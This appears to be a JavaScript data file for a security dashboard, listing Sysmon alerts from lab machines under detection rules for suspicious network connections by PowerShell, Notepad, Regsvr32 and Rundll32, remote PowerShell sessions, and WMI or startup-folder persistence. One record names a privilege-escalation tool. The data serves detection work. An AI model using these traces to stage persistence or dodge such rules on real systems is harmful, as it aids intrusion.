	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":4379,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-D6F7-5D31-0000-00104ACE2500",
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:57:52.847",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":4105,
		"threadid":3400,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-07-19T14:57:58.359021Z",
		"version":5,
		"rulename":"Suspicious NetCon",
		"destinationip":"151.101.0.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49734,
		"sourcehostname":"MSEDGEWIN10.home"
	},
	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":4385,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-DD47-5D31-0000-001015874900",
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 15:11:03.652",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":4111,
		"threadid":3400,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-07-19T15:11:08.184716Z",
		"version":5,
		"rulename":"Suspicious NetCon",
		"destinationip":"151.101.0.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49744,
		"sourcehostname":"MSEDGEWIN10.home"
	},
	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":5137,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-CF4B-5FD8-0000-00101AD58700",
		"processid":3524,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2020-12-15 15:00:14.467",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":589974,
		"threadid":4288,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2020-12-15T15:00:15.695416Z",
		"version":5,
		"destinationhostname":"MSEDGEWIN10CLONE",
		"destinationip":"10.0.2.17",
		"destinationisipv6":"False",
		"destinationport":135,
		"destinationportname":"epmap",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":50007,
		"sourcehostname":"MSEDGEWIN10"
	},
	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":5138,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-CF4B-5FD8-0000-00101AD58700",
		"processid":3524,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2020-12-15 15:00:14.470",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":589975,
		"threadid":4288,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2020-12-15T15:00:15.695478Z",
		"version":5,
		"destinationhostname":"MSEDGEWIN10CLONE",
		"destinationip":"10.0.2.17",
		"destinationisipv6":"False",
		"destinationport":49666,
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":50008,
		"sourcehostname":"MSEDGEWIN10"
	},
	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":7019,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"365ABB72-0244-5CCB-0000-00109AE70B00",
		"processid":1960,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-02 14:48:51.664",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":10272,
		"threadid":132,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-02T14:48:53.950750Z",
		"version":5,
		"destinationip":"151.101.36.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49178,
		"sourcehostname":"IEWIN7.home"
	},
	{
		"Rule level":"low",
		"title":"PowerShell Network Connections - 396D2245",
		"description":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0027s ip range\u0027)",
		"row_id":7328,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-FF9D-5F1D-0000-00100AC62400",
		"processid":3332,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2020-07-26 22:13:19.375",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":339223,
		"threadid":3580,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2020-07-26T22:26:15.141764Z",
		"version":5,
		"destinationhostname":"MSEDGEWIN10",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":445,
		"destinationportname":"microsoft-ds",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49796,
		"sourcehostname":"MSEDGEWIN10"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7897,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:57.111",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5412,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:47:58.830229Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":135,
		"destinationportname":"epmap",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49166,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7898,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:57.119",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5413,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:47:58.830229Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":49167,
		"initiated":"False",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":7777,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7899,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:58.117",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5414,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:47:59.871726Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":49168,
		"initiated":"False",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":7777,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7900,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:58.140",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5415,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:47:59.871726Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":135,
		"destinationportname":"epmap",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49169,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7901,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:59.147",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5416,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:48:00.732965Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":49170,
		"initiated":"False",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":7777,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7902,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B52C-5CEA-0000-00107A0D1100",
		"processid":324,
		"user":"IIS APPPOOL\\DefaultAppPool",
		"utctime":"2019-05-26 15:47:59.148",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5417,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:48:00.732965Z",
		"version":5,
		"destinationhostname":"IEWIN7",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":135,
		"destinationportname":"epmap",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49171,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Notepad Making Network Connection - D6ADF703",
		"description":"Detects suspicious network connection by Notepad",
		"row_id":7905,
		"image":"C:\\Windows\\System32\\notepad.exe",
		"processguid":"365ABB72-B530-5CEA-0000-0010621A1100",
		"processid":324,
		"user":"NT AUTHORITY\\SYSTEM",
		"utctime":"2019-05-26 15:48:00.245",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":5420,
		"threadid":2264,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-26T15:48:01.864592Z",
		"version":5,
		"destinationip":"10.0.2.18",
		"destinationisipv6":"False",
		"destinationport":888,
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.13",
		"sourceisipv6":"False",
		"sourceport":49172,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Regsvr32 Network Activity - E09B640E",
		"description":"Detects network connections and DNS queries initiated by Regsvr32.exe",
		"row_id":505,
		"image":"C:\\Windows\\System32\\regsvr32.exe",
		"processguid":"747F3D96-6638-5D3F-0000-001067BA8900",
		"processid":2640,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-29 21:33:44.949",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":4934,
		"threadid":3496,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-07-29T21:33:46.095763Z",
		"version":5,
		"rulename":"Suspicious NetCon",
		"destinationip":"151.101.0.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49829,
		"sourcehostname":"MSEDGEWIN10.home"
	},
	{
		"Rule level":"high",
		"title":"Regsvr32 Network Activity - E09B640E",
		"description":"Detects network connections and DNS queries initiated by Regsvr32.exe",
		"row_id":601,
		"image":"C:\\Windows\\System32\\regsvr32.exe",
		"processguid":"365ABB72-B167-5CD9-0000-001062160C00",
		"processid":276,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-13 18:03:20.485",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":17289,
		"threadid":2056,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-13T18:03:21.212898Z",
		"version":5,
		"destinationip":"151.101.128.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49159,
		"sourcehostname":"IEWIN7"
	},
	{
		"Rule level":"high",
		"title":"Regsvr32 Network Activity - E09B640E",
		"description":"Detects network connections and DNS queries initiated by Regsvr32.exe",
		"row_id":1462,
		"image":"C:\\Windows\\System32\\regsvr32.exe",
		"processguid":"365ABB72-6759-5CD8-0000-0010E2D50F00",
		"processid":1880,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-12 18:35:04.463",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":3,
		"eventrecordid":16794,
		"threadid":288,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-05-12T18:35:06.562199Z",
		"version":5,
		"destinationip":"104.20.208.21",
		"destinationisipv6":"False",
		"destinationport":80,
		"destinationportname":"http",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49165,
		"sourcehostname":"IEWIN7..home"
	},
	{
		"Rule level":"high",
		"title":"Regsvr32 Network Activity - E09B640E",
		"description":"Detects network connections and DNS queries initiated by Regsvr32.exe",
		"row_id":4317,
		"image":"C:\\Windows\\System32\\regsvr32.exe",
		"processguid":"747F3D96-D978-5D31-0000-0010EB313800",
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:53:40.896",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":4043,
		"threadid":3400,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-07-19T14:53:46.589404Z",
		"version":5,
		"rulename":"Suspicious NetCon",
		"destinationip":"151.101.0.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49728,
		"sourcehostname":"MSEDGEWIN10.home"
	},
	{
		"Rule level":"high",
		"title":"Remote PowerShell Session - C0BA85F0",
		"description":"Detects remote PowerShell connections by monitoring network outbount connections to ports 5985 or 5986 from not network service account",
		"row_id":769,
		"image":"C:\\Windows\\System32\\svchost.exe",
		"processguid":"747F3D96-CA4C-5EC9-0000-001093D53700",
		"processid":2812,
		"user":"NT AUTHORITY\\SYSTEM",
		"utctime":"2020-05-24 01:13:50.129",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":196373,
		"threadid":3488,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2020-05-24T01:13:51.206107Z",
		"version":5,
		"destinationhostname":"MSEDGEWIN10",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":5985,
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49680,
		"sourcehostname":"MSEDGEWIN10"
	},
	{
		"Rule level":"high",
		"title":"Remote PowerShell Session - C0BA85F0",
		"description":"Detects remote PowerShell connections by monitoring network outbount connections to ports 5985 or 5986 from not network service account",
		"row_id":770,
		"image":"C:\\Users\\IEUser\\Tools\\PrivEsc\\RogueWinRM.exe",
		"processguid":"747F3D96-CA4B-5EC9-0000-0010B8CB3700",
		"processid":2812,
		"user":"NT AUTHORITY\\LOCAL SERVICE",
		"utctime":"2020-05-24 01:13:50.129",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":196374,
		"threadid":3488,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2020-05-24T01:13:51.206384Z",
		"version":5,
		"destinationhostname":"MSEDGEWIN10",
		"destinationip":"127.0.0.1",
		"destinationisipv6":"False",
		"destinationport":5985,
		"initiated":"False",
		"protocol":"tcp",
		"sourceip":"127.0.0.1",
		"sourceisipv6":"False",
		"sourceport":49680,
		"sourcehostname":"MSEDGEWIN10"
	},
	{
		"Rule level":"medium",
		"title":"Rundll32 Internet Connection - A0426506",
		"description":"Detects a rundll32 that communicates with public IP addresses",
		"row_id":545,
		"image":"C:\\Windows\\System32\\rundll32.exe",
		"processguid":"747F3D96-6652-5D3F-0000-001058828C00",
		"processid":2640,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-29 21:34:11.123",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":3,
		"eventrecordid":4974,
		"threadid":3496,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":3,
		"systemtime":"2019-07-29T21:34:12.352683Z",
		"version":5,
		"destinationip":"151.101.0.133",
		"destinationisipv6":"False",
		"destinationport":443,
		"destinationportname":"https",
		"initiated":"True",
		"protocol":"tcp",
		"sourceip":"10.0.2.15",
		"sourceisipv6":"False",
		"sourceport":49831,
		"sourcehostname":"MSEDGEWIN10.home"
	},
];

var PersistenceData = [
	{
		"Rule level":"low",
		"title":"Startup Folder File Write - 1181B6C3",
		"description":"A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.",
		"row_id":3883,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-D6F7-5D31-0000-00104ACE2500",
		"processid":2796,
		"utctime":"2019-07-19 14:45:31.276",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":11,
		"eventrecordid":3609,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":11,
		"systemtime":"2019-07-19T14:45:31.287863Z",
		"version":2,
		"creationutctime":"2019-07-18 20:53:13.080",
		"targetfilename":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Notepad.lnk"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":692,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:39.746",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":19,
		"eventrecordid":16115,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":19,
		"systemtime":"2019-05-11T17:58:39.746909Z",
		"version":3,
		"eventtype":"WmiFilterEvent",
		"operation":"Created",
		"eventnamespace":" \"root\\\\cimv2\"",
		"query":" \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":698,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:54.981",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":19,
		"eventrecordid":16121,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":19,
		"systemtime":"2019-05-11T17:58:54.981284Z",
		"version":3,
		"eventtype":"WmiFilterEvent",
		"operation":"Deleted",
		"eventnamespace":" \"root\\\\cimv2\"",
		"query":" \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4329,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:54:57.041",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":19,
		"eventrecordid":4055,
		"threadid":1776,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":19,
		"systemtime":"2019-07-19T14:54:57.044623Z",
		"version":3,
		"eventtype":"WmiFilterEvent",
		"operation":"Created",
		"eventnamespace":" \"root\\\\CimV2\"",
		"query":" \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027 AND TargetInstance.SystemUpTime \u003e= 240 AND TargetInstance.SystemUpTime \u003c 325\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":4334,
		"processid":2796,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-19 14:57:02.963",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":19,
		"eventrecordid":4060,
		"threadid":4356,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":19,
		"systemtime":"2019-07-19T14:57:02.977166Z",
		"version":3,
		"eventtype":"WmiFilterEvent",
		"operation":"Deleted",
		"eventnamespace":" \"root\\\\CimV2\"",
		"query":" \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027 AND TargetInstance.SystemUpTime \u003e= 240 AND TargetInstance.SystemUpTime \u003c 325\""
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":688,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:23.340",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":20,
		"eventrecordid":16111,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":20,
		"systemtime":"2019-05-11T17:58:23.340659Z",
		"version":3,
		"eventtype":"WmiConsumerEvent",
		"destination":" \"c:\\\\Windows\\\\System32\\\\cmd.exe\"",
		"operation":"Created",
		"type":"Command Line"
	},
	{
		"Rule level":"high",
		"title":"WMI Event Subscription - 76D7312E",
		"description":"Detects creation of WMI event subscription persistence method",
		"row_id":697,
		"processid":2032,
		"user":"IEWIN7\\IEUser",
		"utctime":"2019-05-11 17:58:54.903",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":20,
		"eventrecordid":16120,
		"threadid":4092,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":20,
		"systemtime":"2019-05-11T17:58:54.903159Z",
		"version":3,
		"eventtype":"WmiConsumerEvent",
